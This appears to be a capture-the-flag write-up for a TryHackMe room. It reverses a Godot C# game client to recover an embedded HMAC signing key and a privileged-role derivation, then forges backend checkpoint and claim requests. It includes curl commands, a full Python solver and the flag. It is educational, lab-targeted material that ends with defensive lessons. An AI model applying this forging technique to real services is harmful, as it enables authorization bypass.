# Grand Larceny Auto II

## Overview

Grand Larceny Auto II is a reversing and web/protocol challenge packaged as a Godot game. The important point is that the flag is not stored directly in the game assets. The game client talks to a backend service at `gla2.thm`, and the real objective is to reconstruct that backend protocol, prove the required in-game progression, then claim the correct access tier.

The core vulnerability is that the client contains everything required to produce valid backend proof messages:

- The backend URL.
- The route names.
- The checkpoint sequence.
- The HMAC signing key.
- The algorithm used to derive the privileged claim role.

## Target Details

Lab target used during solving:

```text
10.49.140.156    gla2.thm
```

The official setup suggests adding the host mapping to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.49.140.156 gla2.thm" >> /etc/hosts'
```

For command-line testing, the same result can be achieved without editing `/etc/hosts` by sending the virtual host explicitly:

```bash
curl -H 'Host: gla2.thm' http://10.49.140.156/
```

## Tools Used

The following tools were enough to complete the room:

```text
unzip
file
strings
rg
monodis
curl
python3
```

`monodis` is part of Mono and is useful for dumping .NET IL from C# assemblies.

## File Triage

The downloaded task archive contained Linux and Windows builds:

```text
GrandLarcenyAuto-1786669683173.7z
GrandLarcenyAuto-1786669683173/GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip
GrandLarcenyAuto-1786669683173/GrandLarcenyAuto/GrandLarcenyAuto-windows-x86_64.zip
```

The Linux build was extracted first:

```bash
mkdir -p extracted/linux
unzip -q GrandLarcenyAuto-1786669683173/GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip -d extracted/linux
```

Listing the archive contents shows this is a Godot C# build:

```bash
unzip -l GrandLarcenyAuto-1786669683173/GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip | head -40
```

Important files:

```text
GrandLarcenyAuto.pck
GrandLarcenyAuto.x86_64
data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll
data_GrandLarcenyAuto_linuxbsd_x86_64/GodotSharp.dll
data_GrandLarcenyAuto_linuxbsd_x86_64/System.Net.Http.dll
```

The bundled .NET runtime is large, but the actual game assembly is small and high-value:

```text
data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll
```

## Initial String Search

Search the game assembly for likely backend and flag-related terms:

```bash
strings -a extracted/linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll \
  | rg -i 'http|gla|flag|vault|token|api|score|proof|cheat|secret|key|hash|POST|GET'
```

Useful hits included:

```text
get_RealFlag
get_HasFlag
LastFlag
token
SessionOpen
HttpRequest
Post
DeriveKey
SignKey
SafehouseVault
PoPClient
```

The class name `PoPClient` is the main clue. In this context it appears to mean proof-of-play client. That is the component responsible for communicating with the backend service.

## .NET Assembly Reversing

List the classes in the assembly:

```bash
monodis --typedef extracted/linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll
```

Relevant classes:

```text
GrandLarcenyAuto.CheatConsole
GrandLarcenyAuto.CryptoUtil
GrandLarcenyAuto.GameController
GrandLarcenyAuto.PlayerState
GrandLarcenyAuto.PoPClient
GrandLarcenyAuto.SafehouseVault
GrandLarcenyAuto.WantedSystem
```

Dump the full IL:

```bash
monodis extracted/linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll > extracted/GrandLarcenyAuto.il
```

Search for the networking client:

```bash
rg -n 'class .*PoPClient|PoPClient::|ServerUrl|/session|/checkpoint|/claim|SignKey|DeriveStaffRole|LastFlag' extracted/GrandLarcenyAuto.il
```

This identifies `PoPClient` as the backend protocol implementation.

## Backend URL

Inside `GameController._Ready()` and the `PoPClient` constructor, the server URL is set to:

```text
http://gla2.thm
```

The useful IL pattern is:

```text
ldstr "http://gla2.thm"
stfld string GrandLarcenyAuto.PoPClient::ServerUrl
```

That confirms the game is expected to talk to the lab backend through the `gla2.thm` virtual host.

## Backend Routes

The client implements three important POST routes.

### Start Session

`PoPClient.StartSession()` sends:

```http
POST /session
Content-Type: application/json

{}
```

The response contains:

```json
{
  "session_id": "...",
  "stash_order": [2, 0, 1],
  "token": "..."
}
```

The `stash_order` is dynamic. Do not hard-code it unless you are replaying the same session.

### Report Checkpoint

`PoPClient.ReportCheckpoint(step)` sends:

```http
POST /checkpoint
Content-Type: application/json

{
  "session_id": "...",
  "step": "...",
  "token": "...",
  "sig": "..."
}
```

The server responds with the next expected checkpoint and a new token:

```json
{
  "ok": true,
  "step": "heat5",
  "next": "stash2",
  "token": "..."
}
```

The token changes after every accepted checkpoint. The next request must use the latest returned token.

### Claim Flag

`PoPClient.Claim()` sends:

```http
POST /claim
Content-Type: application/json

{
  "session_id": "...",
  "role": "player",
  "token": "...",
  "sig": "..."
}
```

The hard-coded client sends the role `player`, but the assembly also exposes a method called `DeriveStaffRole()`. That method is the clue for the real access tier.

## Signature Algorithm

The signing key is embedded in `PoPClient`:

```text
gla2_crew_sign_v1_2f9b6c8ad14e
```

The IL shows the key being converted to bytes:

```text
ldstr "gla2_crew_sign_v1_2f9b6c8ad14e"
callvirt instance unsigned int8[] class System.Text.Encoding::GetBytes(string)
stsfld unsigned int8[] GrandLarcenyAuto.PoPClient::SignKey
```

The `Sign()` method computes:

```text
hex(HMAC-SHA256(SignKey, UTF8(message)))
```

For checkpoints, the signed message is:

```text
{session_id}|{step}|{token}
```

For the final claim, the signed message is:

```text
{session_id}|claim|{token}
```

Example Python implementation:

```python
import hashlib
import hmac

KEY = b"gla2_crew_sign_v1_2f9b6c8ad14e"

def sign(message: str) -> str:
    return hmac.new(KEY, message.encode(), hashlib.sha256).hexdigest()
```

## Proof-of-Play Flow

The game logic expects the backend state to advance through this sequence:

```text
heat5
stash<first stash id>
stash<second stash id>
stash<third stash id>
vault
claim
```

The stash IDs come from `/session`.

For example, this session response:

```json
{
  "session_id": "jn3uQWzlZuyE_w0Z2KwkUofW",
  "stash_order": [2, 0, 1],
  "token": "fXgnWJjcCRBVvlbXeEiWx98O"
}
```

produces this checkpoint sequence:

```text
heat5
stash2
stash0
stash1
vault
claim
```

## Privileged Role Derivation

The most important reversing finding is `PoPClient.DeriveStaffRole()`.

The method builds a string from the completed proof path:

```text
heat5_stash<order[0]>_stash<order[1]>_stash<order[2]>_vault
```

Then it returns the SHA1 hex digest of that string.

For stash order `[2, 0, 1]`, the role input is:

```text
heat5_stash2_stash0_stash1_vault
```

The staff role is:

```bash
python3 -c 'import hashlib; print(hashlib.sha1(b"heat5_stash2_stash0_stash1_vault").hexdigest())'
```

Output:

```text
49b0f9bd84de847084ce11f60c91f80296b091ae
```

This role is used in the final `/claim` request instead of `player`.

## Manual Exploitation

Start a session:

```bash
curl -i \
  -H 'Host: gla2.thm' \
  -H 'Content-Type: application/json' \
  --data '{}' \
  http://10.49.140.156/session
```

Example response:

```json
{"session_id":"jn3uQWzlZuyE_w0Z2KwkUofW","stash_order":[2,0,1],"token":"fXgnWJjcCRBVvlbXeEiWx98O"}
```

Sign the first checkpoint:

```bash
python3 -c 'import hmac,hashlib; sid="jn3uQWzlZuyE_w0Z2KwkUofW"; step="heat5"; tok="fXgnWJjcCRBVvlbXeEiWx98O"; print(hmac.new(b"gla2_crew_sign_v1_2f9b6c8ad14e", f"{sid}|{step}|{tok}".encode(), hashlib.sha256).hexdigest())'
```

Send the checkpoint:

```bash
curl -i \
  -H 'Host: gla2.thm' \
  -H 'Content-Type: application/json' \
  --data '{"session_id":"jn3uQWzlZuyE_w0Z2KwkUofW","step":"heat5","token":"fXgnWJjcCRBVvlbXeEiWx98O","sig":"f38e27c3a7314e9d73cf45cdfc95efe8b989943f3c5afcdb7ac7f4045f387a60"}' \
  http://10.49.140.156/checkpoint
```

Example response:

```json
{"ok":true,"step":"heat5","next":"stash2","token":"eQIvUfrmoDJsU5h7BPtvSpoy"}
```

Important: use the new token from this response to sign the next checkpoint. Continue with:

```text
stash2
stash0
stash1
vault
```

After the `vault` checkpoint, the server returns `next: null` and a final token. Use that token to sign the claim message:

```text
{session_id}|claim|{final_token}
```

Then claim with the derived staff role:

```bash
curl -i \
  -H 'Host: gla2.thm' \
  -H 'Content-Type: application/json' \
  --data '{"session_id":"jn3uQWzlZuyE_w0Z2KwkUofW","role":"49b0f9bd84de847084ce11f60c91f80296b091ae","token":"P9d1NxAm85UK-CHDAroNY4P4","sig":"f86120f240ace37c6f118ece5e656193082b68437dc94c71923757ed4f519170"}' \
  http://10.49.140.156/claim
```

Response:

```json
{"flag":"THM{Th4ts_th3_wr0ng_g4m3_t0mmy}"}
```

## Automated Solver

The companion script `solve_gla2.py` performs the full flow. It starts a fresh session, reads the dynamic stash order, follows the server's token rotation, derives the staff role, and claims the flag.

```python
#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import json
import urllib.request

SIGN_KEY = b"gla2_crew_sign_v1_2f9b6c8ad14e"


def sign(message: str) -> str:
    return hmac.new(SIGN_KEY, message.encode(), hashlib.sha256).hexdigest()


def post(ip: str, host: str, path: str, payload: dict) -> dict:
    data = json.dumps(payload, separators=(",", ":")).encode()
    request = urllib.request.Request(
        f"http://{ip}{path}",
        data=data,
        method="POST",
        headers={
            "Host": host,
            "Content-Type": "application/json",
        },
    )

    with urllib.request.urlopen(request, timeout=10) as response:
        body = response.read().decode()

    print(f"{path}: {body}")
    return json.loads(body)


def checkpoint(ip: str, host: str, session_id: str, token: str, step: str) -> str:
    signature = sign(f"{session_id}|{step}|{token}")
    response = post(
        ip,
        host,
        "/checkpoint",
        {
            "session_id": session_id,
            "step": step,
            "token": token,
            "sig": signature,
        },
    )
    return response["token"]


def derive_staff_role(stash_order: list[int]) -> str:
    path = "heat5_" + "_".join(f"stash{i}" for i in stash_order) + "_vault"
    return hashlib.sha1(path.encode()).hexdigest()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="TryHackMe target IP")
    parser.add_argument("--host", default="gla2.thm", help="Virtual host")
    args = parser.parse_args()

    session = post(args.ip, args.host, "/session", {})
    session_id = session["session_id"]
    stash_order = session["stash_order"]
    token = session["token"]

    steps = ["heat5"] + [f"stash{i}" for i in stash_order] + ["vault"]
    print(f"[*] Session: {session_id}")
    print(f"[*] Stash order: {stash_order}")
    print(f"[*] Steps: {' -> '.join(steps)}")

    for step in steps:
        token = checkpoint(args.ip, args.host, session_id, token, step)

    role = derive_staff_role(stash_order)
    claim_sig = sign(f"{session_id}|claim|{token}")
    result = post(
        args.ip,
        args.host,
        "/claim",
        {
            "session_id": session_id,
            "role": role,
            "token": token,
            "sig": claim_sig,
        },
    )

    print(f"[+] Role: {role}")
    print(f"[+] Flag: {result.get('flag')}")


if __name__ == "__main__":
    main()
```

Run it:

```bash
python3 solve_gla2.py 10.49.140.156
```

Expected ending:

```text
/claim: {"flag":"THM{Th4ts_th3_wr0ng_g4m3_t0mmy}"}
[+] Flag: THM{Th4ts_th3_wr0ng_g4m3_t0mmy}
```

## Why This Works

The game tries to prevent simple decompilation from revealing the flag by moving the flag to the backend. That design is stronger than storing the flag in local game files, but the backend protocol still trusts client-generated proof.

The client includes:

- A static HMAC key.
- The exact message format to sign.
- The full state progression.
- The privileged role derivation logic.

Because the signing secret is distributed to every player inside the client, it is not actually secret. Once recovered from the assembly, an attacker can produce valid checkpoint and claim messages without playing the game.

The token rotation adds statefulness, but it does not stop replaying the flow because each accepted response returns the next token.

## Troubleshooting

If `/session` does not respond correctly, check the virtual host:

```bash
curl -i -H 'Host: gla2.thm' -H 'Content-Type: application/json' --data '{}' http://TARGET_IP/session
```

If a checkpoint fails with a signature error, verify:

- You used the latest token returned by the previous response.
- The message format is exactly `{session_id}|{step}|{token}`.
- The checkpoint order matches the server-provided `stash_order`.
- The HMAC key is `gla2_crew_sign_v1_2f9b6c8ad14e`.

If the claim returns the wrong tier, verify:

- The claim signature message is `{session_id}|claim|{token}`.
- The role is the SHA1 of `heat5_stashX_stashY_stashZ_vault`.
- The stash IDs are in the exact order returned by `/session`.

## Key Takeaways

This room is a good example of why client-side secrets do not protect backend workflows. Moving the flag server-side is useful, but the server also needs proof that cannot be forged by anyone with the client. Static shared secrets inside game builds are recoverable, and client-side role derivation should not be trusted for authorization.